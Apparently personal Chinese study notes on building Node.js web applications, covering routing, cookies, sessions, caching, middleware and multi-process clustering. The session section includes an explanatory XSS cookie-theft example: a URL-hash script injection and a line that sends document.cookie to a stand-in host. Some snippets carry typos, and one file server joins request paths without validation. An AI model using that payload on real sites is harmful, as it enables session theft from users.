***httpClient***
``` js
const http = require('http');

const options = {
  hostname: '127.0.0.1',
  port: 1337,
  path: '/',
  method: 'GET'
};

const req = http.request(options, (res) => {
  console.log (res.statusCode);
  console.log (JSON.stringify(res.headers));
  res.setEncoding('utf-8');
  res.on('data', (chunk) => {
    console.log (chunk);
  })
})

req.end();
```

### HTTPS

### Websokets



## 构建Web应用

### 基础功能

HTTP_Parser: 解析req对象中的属性(method/url......)

http服务request事件侦听器，不管业务多复杂，只需要传递一个函数给http.createServer(app)

``` js
// 在具体业务开始前，为业务处理的一些细节将会挂载到req/res上
function (req, res) { 
 res.writeHead(200, {'Content-Type': 'text/plain'}); 
 res.end(); 
}
// express中
const app = express();
// 原理
http.createServer(app).listen(1337)
```

#### 根据请求方法进行分发

请求方法存在报文的第一行，第一个单词

**RESTful类Web服务，请求方法决定资源的操作行为**
1. put: 创建
2. post: 更新
3. get: 获取
4. delete: 删除
   
**根据请求方法，决定响应行为**
``` js
function (req, res) {
  switch(req.method) {
    case 'POST':
      update(req, res);
      break;
    case 'PUT':
      create(req, res);
      break;
    case 'GET':
      get(req, res);
      break;
    case 'DELETE':
      remove(req, res);
      break;
  }
}
```

#### 根据路径解析进行分发

路径部分存在于报文的第一行第二部分

**静态文件服务器：**不同的路径响应不同的文件
``` js
function (req, res) {
  let pathname = url.parse(req.url).pathname;
  fs.readFile(path.join(ROOT, pathname), function(err, file) {
    if (err) {
      res.writeHead(404);
      res.end('找不到相关文件');
      return;
    }
    res.writeHead(200)
  })
}
```

**根据路径选择控制器（egg类似这样的方式）**

/controller/action/a/b/c
controller: 控制器
action: 控制器的行为
剩余的值作为参数

``` js
function (req, res) {
  let pathname = url.parse(req.url).pathname;
  const paths = pathname.split('/');
  const controller = paths[1] || 'index';
  const action = paths[2] || 'index';
  const args = paths.slice(3);
  if (handles[controller] && handles[controller][action]) {
    handles[controller][action].apply(null, [req, res].concat(args));
  } else {
    res.writeHead(500);
    res.end('找不到对应的控制器')
  }
}
// 业务部分只用关心业务的实现
handles.index = {};
handles.index.index = function (req, res, foo, bar) {
  res.writeHead(200);
  res.end(foo);
}

```

#### 查询字符串--node提供了querystring模块，但更简洁的是使用url模块（将foo=bar&baz=val转为JSON对象）

业务调用之前，中间件或者框架会将查询字符串转换，挂载到请求对象上，供业务使用

**注意：**如果键出现多次，它的值是一个数组（业务的判断一定要检查是否为数组）

``` js

const url = require('url');
const querystring = require('querystring');
const query = querystring.parse (url.parse(req.url).query);
// 简洁的方法
const query = url.parse(req.url, true).query;

// 业务调用之前，中间件或者框架会将查询字符串转换，挂载到请求对象上，供业务使用
function (req, res) {
  req.query = url.parse(req.url, true).query
}

```

#### Cookie

Cookie处理步骤：
1. 服务器向客户端发送cookie
2. 浏览器将cookie保存
3. 之后每次浏览器都会将cookie发送到服务器
   
req.headers.cookie
业务调用之前，挂载到请求对象上，供业务使用
```js
var parseCookie = function (cookie) { 
  var cookies = {}; 
  if (!cookie) { 
    return cookies; 
  }
  var list = cookie.split(';'); 
  for (var i = 0; i < list.length; i++) { 
    var pair = list[i].split('='); 
    cookies[pair[0].trim()] = pair[1]; 
  } 
  return cookies; 
};
// 业务调用之前，挂载到请求对象上，供业务使用
function (req, res) {
  req.cookies = parseCookie(req.headers.cookie);
  handle(req, res)
}

// 业务代码判断处理
const handle = function (req, res) {
  res.writeHead(200);
  if (!req.cookies.isVisit) {
    // 设置cookie
    res.setHeader('Set-Cookie', serialize('isVisit', '1'))
    res.end('first enter')
  } else {
    ...
  }
}
```

响应报文：`Set-Cookie: name=value; Path=/; Expires=Sun, 23-Apr-23 09:01:35 GMT; Domain=.domain.com;`

**Cookie性能影响**
1. 减少cookie大小（太多cookie存在根域名下占用带宽，很多静态文件的业务不需要cookie）
2. 为静态组件使用不同的域名（减少无效cookie的传输）
3. 减少DNS查询（现今浏览器会对DNS进行缓存）

#### Session

Cookie在客户端和服务器端都可以进行更改，对敏感数据的保护是无效的，使用Session
Session: 数据只保存在服务端，客户端无法修改，无需在协议中传递

***如何将每个客户和服务器中的数据一一对应***

1. 基于Cookie来实现用户和数据的映射（大多使用这样的方式）
2. 通过查询字符串来实现浏览器端和服务器端数据的对应（风险比cookie高）

**session存在的问题**
1. 性能问题（将session存在内存中，用户量大的时候，占用内存较大，可能引发内存泄漏）垃圾回收和内存限制
2. 使用WebWork时，多个进程间不能共享内存，造成session错乱

解决方法：集中化session-->第三方缓存redis/Memcached来存储session-->引起网络访问（但还是要用，原因如下）
使用第三方缓存的原因：
1. Node与缓存服务保持长连接，而非频繁的短链接，握手导致的延迟只影响初始化
2. 高速缓存直接在内存中进行数据访问和存储（异步读取）
3. 缓存服务通常与Node进程运行在相同的机器上或者相同的机房里，网络速度受到的影响很小

**Session与安全**
session的安全主要是让客户端的口令更加安全
1. 将口令通过私钥加密进行签名----响应时将口令和签名进行对比，非法就将服务端的数据立即过期处理
2. 口令需要加一些客户独有的信息

``` js
// 基于Cookie来实现用户和数据的映射
const http = require ('http');

// 生成session
const sessions = {};
const key = 'session_id';
// 过期时间20分钟
const EXPIRES = 20 * 60 * 1000;

const generate = () => {
  const session = {};
  session.id = (new Date ()).getTime () + Math.random ();
  session.cookie = {
    expire: (new Data ()).getTime () + EXPIRES
  };
  sessions[session.id] = session;
  return session;
}

// 请求到来时，检查Cookie中的口令与服务端的数据，如果过期就重新生成
http.createServer((req, res) => {
  const id = req.cookies[key];
  if (!id) {
    req.session = generate ();
  } else {
    // 从内存中读取session
    //const session = sessions[id];
    // 从第三方读取缓存的session
    store.get(id, function (err, session) {
      if (session) {
        if (session.cookie.expire > (new Date ()).getTime ()) {
          // 更新超时时间
          session.cookie.expire = (new Date ()).getTime () + EXPIRES;
          req.session = session;
        } else {
          // 超时，删除旧数据并重新生成
          delete sessions[id];
          req.session = generate ();
        }
      } else {
        // 如果session过期或者口令不对，重新生成session
        req.session = generate ();
      }
    })
  }

  // 口令 --- 将值通过私钥签名，由.分割原值和签名
  let sign = function (val, secret) {
    return val + '.' + crypto
      .createHmac('sha256', secret)
      .update(val)
      .digest('base64')
      .replace(/\=+$/, '')
  }
  // 响应给客户时设置新的值
  let writeHead = res.writeHead;
  res.writeHead = function () {
    let cookies = res.getHeader ('Set-Cookie');
    // 序列化session , 
    // serialize->带有加密方式的字符串，可以防止数据被中途截取，反序列化破解
    // serialize->把其它数据类型转换为可传输的字符串,序列化的数据格式保存数据原有类型
    let session = serialize ('Set-Cookie', req.session.id);
    cookies = Array.isArray(cookies) ? cookies.concat (session) : [ cookies, session ];
    // 将值设置到cookie
    res.setHeader ('Set-Cookie', cookies);
    // 保存到第三方缓存
    store.save (req.session);
    return writeHead.apply (this, arguments);
  }

  // 私钥加密
  res.writeHead = function () {
    let val = sign(req.sessionID, secret);
    res.setHeader ('Set-Cookie', cookie.serialize(key, val))
  }

  // 取出口令进行对比
  let unsign = function (val, secret) {
    let str = val.slice(0, val.lastIndexOf('.'));
    return sign(str, secret) == val ? str : false
  }

  // 判断是否有session
  if (!req.session.isVisit) {
    res.session.isVisit = true;
    res.writeHead (200);
    res.end ('first')
  } else {
    res.writeHead (200);
    res.end ('again')
  }
}).listen(3000, '127.0.0.1');
```

***XSS攻击获取cookie***
``` js
// 前端
$('#box').html(location.hash.replace('#', ''))

// 攻击者发现构造url
'http://a.com/pathname#<script src="http://b.com/c.js"></script>'
// url压缩
'http://url.cn/fasdlfb'// 将它发送给登录的用户

//c.js将用的cookie提交给c网站
location.href = "http://c.com/?" + document.cookie;

```

**缓存**
1. 添加Expires或Cache-Control到报文头中
2. 配置ETags
3. 让Ajax可缓存

缓存静态资源----GET请求
1. 判断lastModified（服务器端返回本地文件的最后修改时间）是否等于if-modified-since（浏览器会向服务器传送报头，询问该时间之后文件是否有被修改过，本地浏览器存储的文件修改时间）,询问服务器是否有更新的版本，如果服务器端的资源没有变化，则时间一致，自动返回HTTP状态码304（Not Changed.）状态码，内容为空，客户端接到之后，就直接把本地缓存文件显示到浏览器中，这样就节省了传输数据量。

缺点：
1. 文件的时间戳改动，但内容不一定改动
2. 时间戳精确到秒级别，更新频繁的内容将无法生效
3. 浪费带宽

2. 服务器端生成ETag----根据文件内容生成散列值
判断if_None-Match是否等于ETag

缺点：仍然会发起一个请求

3. 服务器在响应内容的同时，让浏览器也缓存
在响应里设置Expire/Cache-Control，浏览器将根据该值进行缓存

Expire: 
1. GMT时间字符串，浏览器接收到这个时间后，在到期时间之前，都不会再发起请求，
2. 缺陷： 浏览器和服务器时间可能不一致

Cache-Control：设置max-age

***max-age会覆盖Expire***

**清除缓存**
每次发布设置版本号和根据内容生产hash值更加高效

**Basic认证：**将用户和密码组合，转为base64字符串存在请求报文的Authorization中

### 数据上传

数据上传与安全
1. 内存限制->上传大小超过限制就停止接收数据，通过流式解析，将数据流导向磁盘，Node只保留文件路径等小数据
2. CSRF->跨站请求伪造


### 路由解析

**文件路径型**
1. 静态文件
2. 动态文件

**MVC**
M: 数据相关的操作和封装
V: 视图的渲染
C: 一组行为的集合
1. 手工映射
2. 自然映射

**RESTful**: 表现层状态转化->将服务器端提供的内容实体看作一个资源，并表现在URL上
资源的具体格式：在请求头Accept:application/json,application/xml中,响应头中Content-Type: application/json

设计：通过URL设计资源，请求方法定义资源的操作，Accept决定资源的表现形式

1. 增POST
2. 删Delete
3. 改PUT
4. 查GET

### 中间件-->简化和隔离基础设施与业务逻辑
1. 编写高效的中间件
  使用高效的方法
  缓存需要重复计算的结果
  避免不必要的计算（HTTP报文解析，get不用）
2. 合理利用路由
  对不同的路由精确匹配执行不同的中间件

#### 异常处理 next方法中添加err参数，next(err), 捕获中间件直接抛出的同步异常

中间件使web应用具备良好的可扩展性合可组合性

### 页面渲染

#### 1. MIME
浏览器通过不同的Content-Type的值来决定采用不同的渲染方式，这个值简称MIME值

**不同的文件类型具有不同的MIME值**
1. JSON: application/json
2. XML: application/xml
3. PDF: application/pdf

通过mime模块查询mime值
```js
const mime = require ('mime')
mime.lookup('file.txt')
```

Content_Type中还可以包含其他参数，如字符集
`Content-Type: 'application/json; charset=utf-8'`

#### 2. 附件下载
只需弹出并下载
Content-Disposition: 根据他的值判断将报文数据当作即时浏览的内容还是下载附件
``` js
Content-Disposition: 'inline', // 只需即时查看
Content-Disposition: 'attachment'; filename="filename.ext" // 可下载附件 filename指定下载的文件名

```
响应文件
``` js
res.sendfile = function (filepath) { 
 fs.stat(filepath, function(err, stat) { 
 var stream = fs.createReadStream(filepath); 
 // 设置内容
 res.setHeader('Content-Type', mime.lookup(filepath)); 
 // 设置长度 
 res.setHeader('Content-Length', stat.size); 
 // 设置为附件
 res.setHeader('Content-Disposition' 'attachment; filename="' + path.basename(filepath) + '"'); 
 res.writeHead(200); 
 stream.pipe(res); 
 }); 
};
```

#### 3. 响应JSON
``` js
res.json = function () {
  res.setHeader('Content-Type', 'application/json'); 
  res.writeHead(200); 
  res.end(JSON.stringify(json)); 
};
}
```

#### 4. 响应跳转链接
``` js
res.redirect = function (url) { 
 res.setHeader('Location', url); 
 res.writeHead(302); 
 res.end('Redirect to ' + url); 
};
```

### 视图渲染

render: 
模板是带有特殊标签的HTML片段，通过与数据的渲染，将数据填充到这些特殊的标签中，最后生成普通的带数据的HTML片段。

```js
res.render = function (view ,data) {
  res.setHeader('Content-Type', 'text/html')
  res.writeHead(200)
  let html = render(view, data)
  res.end(html)
}
```

### 模板


## 进程

**nodejs单线程的问题**
1. 如何利用多核CPU
2. （未捕获到错误，引起进程崩溃）如何保证进程的健壮性和稳定性

### 1. 服务模型变迁
服务器处理客户端请求的并发量

每次响应服务时间为N
1. 同步（一次只为一个请求）：性能低, QPS: 1 / N
2. 复制进程（一个进程对应一个服务）：进程太多，浪费，启动慢，内存占用大QPS: M(进程数) / N
3. 多线程（一个线程服务一个请求）：线程切换上下文开销大 QPS: M * L(线程所占进程资源1/L) / N
4. 事件驱动

### 2. 多进程架构------集群
node通过fork复制多个进程，目的不是解决高并发而是利用多核CPU

**child_process模块让node可以随意创建子进程**
1. spawm() 启动一个进程来执行命令
2. exec() 启动一个进程来执行命令，有回调函数获知子进程的状况
3. execFile() 启动一个子进程来执行可执行文件（可以直接执行的文件，js文件首行要加#!/usr/bin/env node）
4. fork() 与spawn()类似，不同点在于它创建Node的子进程只需指定要执行的js文件模块

exec/execFile，创建时可以指定timeout, 超时后自动kill

``` js
const child = require('child_process');

child.fork('./work.js')

child.spawn('node', ['work.js'])

child.exec('node hello.js', (err, stdout, stderr) => {
  console.log (err, stdout, stderr)
})

child.execFile('hello.js', (err, stdout, stderr) => {
  console.log (err, stdout, stderr)
})
```

### 3.进程间通信

1. HTML5使用webWorker的
```js

// parent
const work = new Worker();

work.onmessage= function (event){
  console.log(event.data)
}

// child
postMessage('hello') 

```

2. node
ICP通道：进程间通信, 创建进程之前先建立ICP通道进行监听，并通过环境变量NODE_CHANNEL_FD告诉子进程这个ICP通道的文件描述符，子进程启动过程中，根据文件描述符去链接这个已存在的IPC通道，从而完成父子进程之间的连接
ICP具体细节由libuv提供
               IPC
      windows       Unix
      named pipe    Domain Socket
``` js

// parent.js
const cp = require('child_process').fork;
const n = cp('./sub.js')
n.on('message', (mes) => {
  console.log ('parentMessage', mes)
})

n.send({ hello: 'world' })


// sub.js
process.on('message', (msg) => {
  console.log ('Child Get Msg', msg)
})
process.send({ foo: 'bor' })

```

3. 句柄传递
创建子进程后，将多个进程监听到同一个端口，端口会被占用
**解决方式**
每个进程监听不同的端口，主进程监听80端口，接收不同的请求代理到不同的端口
（代理可以解决端口占用的问题，也能在代理中做负载均衡，但代理进程与工程进程共用时，会占用两个文件描述符，浪费一倍数量，影响了系统的扩展能力）

**最终解决方式**
句柄: （send参数就是句柄）是一种可以用来标识资源的引用，内部包含了指向对象的文件描述符
用句柄标识一个服务端socket对象， 客户端socket对象，UDP套接字，管道

``` js
child.send(message, [ sendHandle ])
```

***使用句柄***：主进程接收到socket请求后，将这个socket直接发送给工作进程，而不是与工作进程之间建立socket链接来传送数据，文件描述符浪费的问题就解决了

``` js
˞// 主进程
var child = require('child_process').fork('child.js'); 
// Open up the server object and send the handle 
var server = require('net').createServer(); 
server.on('connection', function (socket) { 
  socket.end('handled by parent\n'); 
}); 
server.listen(1337, function () { 
  child.send('server', server); 
}); 

// 工作进程
process.on('message', function (m, server) { 
  if (m === 'server') { 
    server.on('connection', function (socket) { 
      socket.end('handled by child\n'); 
    }); 
  } 
});
```

### 4. 集群稳定

搭建好集群，充分利用多核CPU, 处理客户端大量请求，还需考虑一些细节
1. 性能问题
2. 多个工作进程的存活状态管理
3. 工作进程的平滑重启
4. 配置或者静态数据的动态重新载入
5. 其他细节

#### 进程事件
父进程通过事件向子进程发送信号，子进程根据信号执行相应的处理, 子进程接受到信号后可以重启一个进程来处理相应的事务

error, exit, close, disconnect, kill

***自动重启***
监听未捕获的异常
``` js

var http = require("http");
var server = http.createServer(function (req, res) {
  res.writeHead(200, { "Content-Type": "text/plain" });
  res.end("handled by child, pid is " + process.pid + "\n");
});
var worker;
process.on("message", function (m, tcp) {
  if (m === "server") {
    worker = tcp;
    worker.on("connection", function (socket) {
      server.emit("connection", socket);
    });
  }
});
process.on("uncaughtException", function () {
  // 一旦有未捕获的异常，进程立即停止接收新的连接
  worker.close(function () {
    // 所有已有连接断开后，退出进程, 
    // 主进程在侦听到工作进程退出后，将立即启动新的进程服务, 已保证整个集群中总是有进程为自己服务
    process.exit(1);
  });
});


```

**自杀信号：**主进程在侦听到工作进程退出后，将立即启动新的进程服务,中间过程新发的请求会没有进程服务，为此在子进程退出后，向父进程发送自杀信号，父进程收到后，立即开启新的进程来服务, 至此完成了进程的平滑启动

``` js
// work.js 工作进程
process.on("uncaughtException", function () {
  // 向主进程发送自杀信号
  process.send({act: 'suicide'})
  // 一旦有未捕获的异常，进程立即停止接收新的连接
  worker.close(function () {
    // 所有已有连接断开后，退出进程, 
    // 主进程在侦听到工作进程退出后，将立即启动新的进程服务, 已保证整个集群中总是有进程为自己服务
    process.exit(1);
  });
});

// 主进程
var createWorker = function () {
  var worker = fork(__dirname + '/worker.js'); 
    // 启动ႎ的进程
  worker.on('message', function (message) { 
    if (message.act === 'suicide') { 
      createWorker(); 
    } 
  }); 
  worker.on('exit', function () { 
    console.log('Worker ' + worker.pid + ' exited.'); 
    delete workers[worker.pid]; 
  }); 
  worker.send('server', server); 
  workers[worker.pid] = worker; 
  console.log('Create worker. pid: ' + worker.pid); 
};
```

**强制退出进程, 并记录日志：**设置超时时间（对于长连接TCP）

``` js
// work.js 工作进程
process.on("uncaughtException", function (err) {
  // 记录日志
  logger.error (err)
  // 向主进程发送自杀信号
  process.send({act: 'suicide'})
  // 一旦有未捕获的异常，进程立即停止接收新的连接
  worker.close(function () {
    // 所有已有连接断开后，退出进程, 
    // 主进程在侦听到工作进程退出后，将立即启动新的进程服务, 已保证整个集群中总是有进程为自己服务
    process.exit(1);
  });
  // 5秒后退出进程
  setTimeout(function () { 
    process.exit(1); 
  }, 5000);
});
```

**限量重启：**当工作进程出现错误，主进程重启进程来服务，短时间内如果多个工作进程出现错误，主进程就会重启多个，不符合设置，进程有问题，需要限量重启，重启太频繁（超过限制）触发giveup（放弃重启工作进程（没有任何服务进程了），比uncaughtException事件更严重，应该记录日志告警）事件

``` js 
// 重启次数
var limit = 10; 
// 时间单位
var during = 60000; 
var restart = []; 
var isTooFrequently = function () { 
  //记录重启时间
  var time = Date.now(); 
  var length = restart.push(time); 
  if (length > limit) { 
  // 取出最后10个记录
  restart = restart.slice(limit * -1); 
  } 
  // 最后一次重启到前10次之间的时间间隔
  return restart.length >= limit && restart[restart.length - 1] - restart[0] < during; 
}; 
var workers = {}; 
var createWorker = function () { 
  // 检查是否太过频繁
  if (isTooFrequently()) {  
    process.emit('giveup', length, during); 
    return; 
  } 
  var worker = fork(__dirname + '/worker.js'); 
  worker.on('exit', function () { 
    console.log('Worker ' + worker.pid + ' exited.'); 
    delete workers[worker.pid]; 
  }); 
  worker.on('message', function (message) { 
    if (message.act === 'suicide') { 
      createWorker(); 
    } 
  }); 
  // 句柄转发
  worker.send('server', server); 
  workers[worker.pid] = worker; 
  console.log('Create worker. pid: ' + worker.pid); 
};
```

#### 负载均衡
将多个进程监听到同一个端口, 分配处理进程时Node采用抢占式策略会产生负载均衡
**处理方式**： Round-Robin轮叫调度
n个进程中每次选择i = (i + 1) mod n

``` js
// 启用Round-Robin 
cluster.schedulingPolicy = cluster.SCHED_RR 
// 不启用Round-Robin
cluster.schedulingPolicy = cluster.SCHED_NONE 
// 在环境变量中设置NODE_CLUSTER_SCHED_POLICY的值
export NODE_CLUSTER_SCHED_POLICY=rr 
export NODE_CLUSTER_SCHED_POLICY=none

```

#### 状态共享
进程之前共享数据
***第三方数据存储（数据库、磁盘、缓存服务-redis）***
直接放在内存中，当数据变化后需要一种机制来处理，（定时轮询，浪费资源），变化后主动通知（减少轮询，多台服务器采用长连接UDP/TCP）

#### Cluster 模块： 解决多核CPU利用的问题

``` js
var cluster = require("cluster");

// 实现使用child_process相同的效果
// 建议使用setupMasterApi
cluster.setupMaster({
  exec: "worker.js",
});
var cpus = require("os").cpus();
for (var i = 0; i < cpus.length; i++) {
  cluster.fork();
}
```

***判断是否是主进程***
``` js
cluster.isWorker = ('NODE_UNIQUE_ID' in process.env); 
cluster.isMaster = (cluster.isWorker === false);
```

***Cluster模块的原理***
事实上cluster就是child_process、net模块的组合应用

**Cluster事件**
fork: 
online:
listening:
disconnect:
exit:
setUp: 

















